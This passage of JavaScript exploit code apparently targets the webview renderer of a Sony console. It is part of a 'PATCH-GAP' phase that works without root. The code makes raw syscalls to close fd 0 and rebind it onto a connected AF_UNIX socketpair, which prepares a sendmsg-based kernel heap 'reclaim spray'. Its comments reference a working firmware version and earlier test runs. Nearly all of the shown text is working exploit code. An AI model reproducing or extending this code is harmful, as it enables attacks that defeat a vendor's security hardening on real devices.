...
// Phase 2: PATCH-GAP. Even without root, if Sony hardened ONLY the
        ...
        if (params.get("probe") === "verbatim") {
            ...
            // Reference env (13.00 working): fd0 is a real CONNECTED AF_UNIX
            // socket -- the first socketpair landed on 0/1 because stdio fds
            // are closed in that webview. Our renderer has fd0 taken by a
            // non-socket, so a literal sendmsg(0,...) would allocate nothing
            // (the 22:44 /v run proved fail=128/128). Rebind fd0 onto a fresh
            // connected socketpair BEFORE the reclaim spray, restoring the
            // reference environment exactly.
            let sprayFd = 0;
            if (!fd0IsSocket) {
                const c0 = sc(SYS.close, 0).i32;
                const rsp0 = sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32;
                if (rsp0 === 0) sprayFd = argDv.getInt32(0, true);
                VB("fd0 rebind close(0)=" + c0 + " socketpair=" + rsp0
                    + " fds=" + (rsp0 === 0 ? argDv.getInt32(0, true) + "/" + argDv.getInt32(4, true) : "n/a"));
                if (rsp0 !== 0 || sprayFd !== 0) {
                    VB("ABORT fd0 rebind failed (pair=" + rsp0 + " fd=" + sprayFd + ")");
                    mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
                    return;
                }
                fdv.setUint32(0, 4, true);
                const g0v = sc(SYS.getsockopt, 0, 0xffff, 0x3, fdAddr.add32(8), fdAddr).i32;
                VB("fd0 rebind SO_TYPE rv=" + g0v + " type=" + fdv.getUint32(8, true) + " (expect 1=STREAM)");
            }
